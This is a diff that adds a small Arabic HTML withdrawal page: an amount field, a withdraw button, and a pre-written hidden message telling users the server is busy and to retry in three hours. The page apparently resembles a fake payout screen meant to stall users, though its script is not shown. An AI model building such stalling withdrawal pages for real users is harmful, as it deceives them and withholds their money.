@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>السحب - Pay Now</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<div class="container">
+    <h2>إدخال المبلغ</h2>
+    <input type="number" id="amountInput" placeholder="أدخل المبلغ">
+    <button class="btn" onclick="processWithdrawal()">سحب</button>
+    
+    <div id="loadingBlue" class="loading-blue hidden"></div>
+    <p id="serverMessage" class="hidden">السيرفر مزدحم، الرجاء المحاولة بعد 3 ساعات</p>
+
+    <p class="privacy" onclick="showSavedData()">📜 سياسة الخصوصية</p>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
